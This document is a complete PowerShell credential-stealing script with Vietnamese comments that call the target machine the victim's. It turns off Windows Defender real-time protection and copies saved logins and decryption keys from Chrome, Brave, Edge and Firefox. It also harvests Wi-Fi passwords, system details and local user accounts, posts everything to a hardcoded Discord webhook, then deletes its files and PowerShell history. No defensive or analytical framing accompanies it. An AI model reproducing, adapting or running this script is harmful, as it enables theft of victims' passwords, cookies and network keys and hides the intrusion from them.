#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Thu muc tam tren may nan nhan
$destDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force
}

# Tao thu muc con
$sysInfoDir = "$destDir\SystemInfo"
New-Item -ItemType Directory -Path $sysInfoDir -Force

# Tat Windows Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
} catch {}

# ==========================================
# DISCORD WEBHOOK FUNCTION - GUI TEXT
# ==========================================
function Send-DiscordText {
    param([string]$Title, [string]$Content)
    
    if ([string]::IsNullOrWhiteSpace($Content)) {
        Write-Host "[-] No content for: $Title"
        return
    }
    
    # Discord gioi han 2000 ky tu moi message
    if ($Content.Length -gt 1900) {
        $Content = $Content.Substring(0, 1900) + "...`n[TRUNCATED]"
    }
    
    $payload = @{
        content = "**[$Title]**`n```$Content```"
    } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
        Write-Host "[+] Sent: $Title"
    } catch {
        Write-Host "[-] Failed to send: $Title - $_"
    }
}

# Ham gui nhieu phan (neu noi dung dai)
function Send-DiscordLongText {
    param([string]$Title, [string]$Content, [int]$MaxLength = 1900)
    
    if ([string]::IsNullOrWhiteSpace($Content)) { return }
    
    if ($Content.Length -le $MaxLength) {
        Send-DiscordText $Title $Content
        return
    }
    
    # Chia nho noi dung
    $parts = [math]::Ceiling($Content.Length / $MaxLength)
    for ($i = 0; $i -lt $parts; $i++) {
        $start = $i * $MaxLength
        $length = [Math]::Min($MaxLength, $Content.Length - $start)
        $partContent = $Content.Substring($start, $length)
        $partTitle = "$Title (Part $($i+1)/$parts)"
        Send-DiscordText $partTitle $partContent
        Start-Sleep -Milliseconds 500
    }
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDir)) {
        Write-Host "$browserName - Directory not found"
        return
    }
    
    New-Item -ItemType Directory -Path $browserDestDir -Force | Out-Null

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            try {
                Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
                Write-Host "$browserName - Copied: $file"
            } catch {
                try {
                    [System.IO.File]::Copy($source, (Join-Path $browserDestDir $file), $true)
                    Write-Host "$browserName - Copied (alternative): $file"
                } catch {
                    Write-Host "$browserName - Failed to copy: $file"
                }
            }
        } else {
            Write-Host "$browserName - Not found: $file"
        }
    }
}

# Ham doc file va tra ve noi dung (xu ly file nhi phan)
function Get-FileContentAsText {
    param([string]$FilePath)
    
    if (-not (Test-Path $FilePath)) { return $null }
    
    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        # Chi lay 5000 bytes dau de tranh qua dai
        if ($bytes.Length -gt 5000) {
            $bytes = $bytes[0..4999]
            $isTruncated = $true
        } else {
            $isTruncated = $false
        }
        
        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
        if ($isTruncated) {
            $text += "`n[FILE TRUNCATED - Original size: $([math]::Round((Get-Item $FilePath).Length/1KB, 2)) KB]"
        }
        return $text
    } catch {
        return "[Cannot read file: $_]"
    }
}

# ==========================================
# 1. GOOGLE CHROME
# ==========================================
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromeDir) {
    CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$destDir\Chrome\" -Force -ErrorAction SilentlyContinue
    }
}

# ==========================================
# 2. BRAVE
# ==========================================
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $braveDir) {
    CopyBrowserFiles "Brave" $braveDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$destDir\Brave\" -Force -ErrorAction SilentlyContinue
    }
}

# ==========================================
# 3. FIREFOX
# ==========================================
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfiles) {
    $firefoxProfile = Get-ChildItem -Path $firefoxProfiles -Filter "*.default*" | Select-Object -First 1
    if ($firefoxProfile) {
        CopyBrowserFiles "Firefox" $firefoxProfile.FullName @("logins.json", "key4.db", "cookies.sqlite")
    }
}

# ==========================================
# 4. MICROSOFT EDGE
# ==========================================
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDir) {
    CopyBrowserFiles "Edge" $edgeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$destDir\Edge\" -Force -ErrorAction SilentlyContinue
    }
}

# ==========================================
# 5. SYSTEM INFORMATION
# ==========================================
Write-Host "[+] Gathering system information..."
Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
Get-Service | Out-File "$sysInfoDir\service_list.txt" -ErrorAction SilentlyContinue
Get-NetIPAddress | Out-File "$sysInfoDir\network_config.txt" -ErrorAction SilentlyContinue
Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue

# ==========================================
# 6. WIFI PASSWORDS
# ==========================================
Write-Host "[+] Extracting WiFi passwords..."
$wifiFile = "$destDir\WiFi_Details.txt"
"="*60 | Out-File $wifiFile
"WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
"Extracted: $(Get-Date)" | Out-File $wifiFile -Append
"="*60 | Out-File $wifiFile -Append
"" | Out-File $wifiFile -Append

$wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
    if (-not $keyContent) { $keyContent = "No password (Open network)" }
    "$profile : $keyContent" | Out-File $wifiFile -Append
}

# ==========================================
# 7. GUI DU LIEU QUA DISCORD (DANG TEXT)
# ==========================================
Write-Host "[+] Sending data to Discord..."

# Gui thong bao bat dau
Send-DiscordText "TARGET INFORMATION" "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date)"

# Gui WiFi passwords
$wifiContent = Get-Content $wifiFile -Raw -ErrorAction SilentlyContinue
if ($wifiContent) {
    Send-DiscordLongText "WiFi Passwords" $wifiContent
} else {
    Send-DiscordText "WiFi Passwords" "No WiFi profiles found"
}

# Gui Computer Info
$computerInfo = Get-Content "$sysInfoDir\computer_info.txt" -Raw -ErrorAction SilentlyContinue
if ($computerInfo) {
    Send-DiscordLongText "Computer Information" $computerInfo
}

# Gui Local Users
$localUsers = Get-Content "$sysInfoDir\local_users.txt" -Raw -ErrorAction SilentlyContinue
if ($localUsers) {
    Send-DiscordLongText "Local Users" $localUsers
}

# Gui Network Config
$networkConfig = Get-Content "$sysInfoDir\network_config.txt" -Raw -ErrorAction SilentlyContinue
if ($networkConfig) {
    Send-DiscordLongText "Network Configuration" $networkConfig
}

# Gui Process List (tom tat)
$processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 30 | Out-String
Send-DiscordText "Top 30 Processes by CPU" $processes

# Gui browser credentials
$browsers = @("Chrome", "Brave", "Edge", "Firefox")
foreach ($browser in $browsers) {
    $browserDir = "$destDir\$browser"
    if (Test-Path $browserDir) {
        $loginDataFile = "$browserDir\Login Data"
        if (Test-Path $loginDataFile) {
            $content = Get-FileContentAsText $loginDataFile
            Send-DiscordLongText "$browser - Login Data (Raw)" $content
        }
        
        $localStateFile = "$browserDir\Local State"
        if (Test-Path $localStateFile) {
            $content = Get-FileContentAsText $localStateFile
            Send-DiscordLongText "$browser - Local State (Decryption Key)" $content
        }
        
        # Firefox specific
        $loginsJson = "$browserDir\logins.json"
        if (Test-Path $loginsJson) {
            $content = Get-FileContentAsText $loginsJson
            Send-DiscordLongText "Firefox - logins.json" $content
        }
        
        $key4db = "$browserDir\key4.db"
        if (Test-Path $key4db) {
            $content = Get-FileContentAsText $key4db
            Send-DiscordLongText "Firefox - key4.db (Partial)" $content
        }
    }
}

# Gui thong bao hoan tat
Send-DiscordText "EXFILTRATION COMPLETED" "Target: $env:COMPUTERNAME`nUser: $env:USERNAME`nCompleted: $(Get-Date)"

# ==========================================
# 8. DON DEP
# ==========================================
Write-Host "[+] Cleaning up..."
Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if ($historyPath -and (Test-Path $historyPath)) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

Write-Host "[+] Done!"

exit
